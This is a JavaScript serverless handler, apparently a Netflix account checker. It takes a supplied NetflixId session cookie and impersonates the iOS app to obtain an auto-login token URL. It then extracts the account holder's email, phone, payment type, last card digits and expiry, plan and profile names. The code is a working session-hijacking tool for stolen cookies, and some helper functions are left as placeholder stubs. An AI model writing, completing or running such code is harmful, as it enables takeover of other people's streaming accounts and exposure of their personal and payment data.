// api/generate.js
const COUNTRY_MAP = { /* poori map yahan daal dena (last code wali) */ };

function getCountryDisplay(code) { return COUNTRY_MAP[code] ? `${COUNTRY_MAP[code]} (${code})` : code; }
function extractCookies(text) { /* same as before */ }
function parsePayment(account) { /* same as before */ }

async function handler(req, res) {
  // CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed. Use POST.' });
  }

  const { cookie: raw_cookie, device = 'mobile' } = req.body || {};
  const trimmedCookie = (raw_cookie || '').trim();

  if (!trimmedCookie) {
    return res.status(400).json({ error: 'No cookie data provided.', cookie: '' });
  }

  try {
    const cookie_dict = extractCookies(trimmedCookie);
    if (!cookie_dict.NetflixId) {
      return res.status(400).json({
        error: 'Missing required cookie: NetflixId.',
        cookie: trimmedCookie.substring(0, 100)
      });
    }

    const api_url = 'https://ios.prod.ftl.netflix.com/iosui/user/15.48';

    // ---------- STEP 1: Get Token (original working path) ----------
    const tokenQuery = new URLSearchParams({
      appVersion: '15.48.1',
      config: '{"gamesInTrailersEnabled":"false",...}',  // same as original
      device_type: 'NFAPPL-02-',
      esn: 'NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200',
      idiom: 'phone',
      iosVersion: '15.8.5',
      isTablet: 'false',
      languages: 'en-US',
      locale: 'en-US',
      maxDeviceWidth: '375',
      model: 'saget',
      modelType: 'IPHONE8-1',
      odpAware: 'true',
      path: '["account","token","default"]',   // <--- original path
      pathFormat: 'graph',
      pixelDensity: '2.0',
      progressive: 'false',
      responseFormat: 'json'
    });

    // mobile headers (same as original)
    const tokenHeaders = {
      'User-Agent': 'Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)',
      'x-netflix.request.attempt': '1',
      // ... (poora header set yahan daalo)
      'Cookie': `NetflixId=${cookie_dict.NetflixId}`,
    };

    const tokenRes = await fetch(`${api_url}?${tokenQuery.toString()}`, {
      method: 'GET',
      headers: tokenHeaders,
    });

    if (!tokenRes.ok) {
      if ([401, 403, 400].includes(tokenRes.status)) {
        return res.json({ expired: true, error: 'Cookies expired or invalid.', cookie: trimmedCookie.substring(0, 100) });
      }
      return res.status(tokenRes.status).json({ error: `Netflix API returned ${tokenRes.status}`, cookie: trimmedCookie.substring(0, 100) });
    }

    const tokenData = await tokenRes.json();
    const tokenDefault = tokenData?.value?.account?.token?.default || {};
    const token = tokenDefault.token;
    let expires = tokenDefault.expires;

    if (!token) {
      return res.json({ expired: true, error: 'Token not found. Cookie expired.', cookie: trimmedCookie.substring(0, 100) });
    }

    if (typeof expires === 'number' && expires.toString().length === 13) {
      expires = Math.floor(expires / 1000);
    }
    const login_url = `https://netflix.com/?nftoken=${encodeURIComponent(token)}`;

    // ---------- STEP 2: Get Account Details ----------
    const userQuery = new URLSearchParams({
      appVersion: '15.48.1',
      config: '{"gamesInTrailersEnabled":"false",...}',
      device_type: 'NFAPPL-02-',
      esn: 'NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200',
      idiom: 'phone',
      iosVersion: '15.8.5',
      isTablet: 'false',
      languages: 'en-US',
      locale: 'en-US',
      maxDeviceWidth: '375',
      model: 'saget',
      modelType: 'IPHONE8-1',
      odpAware: 'true',
      path: '["user","account"]',   // <--- just user and account
      pathFormat: 'graph',
      pixelDensity: '2.0',
      progressive: 'false',
      responseFormat: 'json'
    });

    const userHeaders = { ...tokenHeaders }; // same headers, cookie set
    const userRes = await fetch(`${api_url}?${userQuery.toString()}`, {
      method: 'GET',
      headers: userHeaders,
    });

    const userData = await userRes.json();
    const user = userData?.value?.user || {};
    const account = userData?.value?.account || {};

    // --- Extract details ---
    const email = user.email || 'N/A';
    const countryCode = user.countryOfSignup || 'N/A';
    const country_display = getCountryDisplay(countryCode);
    const planName = user.membershipPlan?.plan || 'N/A';
    const planDisplay = planName.charAt(0) + planName.slice(1).toLowerCase();
    const price = user.membershipPlan?.recurringCharge;
    const currency = user.membershipPlan?.currency;
    const price_display = price && currency ? `${currency} ${price}` : 'N/A';
    const memberSince = account.planInfo?.memberSince || user.membershipStartDate || 'N/A';
    const renewalDate = account.planInfo?.renewalDate || 'N/A';
    const payment = parsePayment(account);
    const phone = account.phone || user.phone || 'N/A';
    const profilesArray = user.profiles || [];
    const profileNames = profilesArray.map(p => p.profileName || p.name).filter(Boolean).join(', ') || 'N/A';
    const profilesCount = profilesArray.length || 'N/A';
    const membershipStatus = user.membershipStatus || 'CURRENT_MEMBER';
    const statusText = membershipStatus === 'CURRENT_MEMBER' ? 'Active' : 'Inactive';

    // --- Full response ---
    const response = {
      status: "SUCCESS",
      url: login_url,
      expires_ts: Number(expires),
      expires: new Date(Number(expires) * 1000).toISOString().replace('T', ' ').split('.')[0],
      account: {
        email, phone, country: country_display,
        membershipStatus: statusText, memberSince,
        plan: { name: planDisplay, price: price || undefined, currency: currency || undefined },
        payment,
        profiles: { count: profilesCount, names: profileNames }
      },
      // legacy fields
      email, country: countryCode, country_display, plan: planDisplay, price: price_display,
      renewal_date: renewalDate, member_since: memberSince,
      payment: payment.type + (payment.lastFourDigits !== 'N/A' ? ` •••• ${payment.lastFourDigits}` : '') + (payment.expiry !== 'N/A' ? ` (Exp: ${payment.expiry})` : ''),
      phone, profiles_count: profilesCount, profile_names: profileNames,
      x_mail: email, x_tier: planDisplay, x_loc: countryCode, x_ren: renewalDate,
      x_mem: memberSince, x_bil: payment.type, x_tel: phone, x_usr: profileNames,
    };

    return res.json(response);

  } catch (error) {
    console.error('Function error:', error);
    return res.status(500).json({
      error: 'Internal server error.',
      cookie: trimmedCookie.substring(0, 100)
    });
  }
}

module.exports = handler;
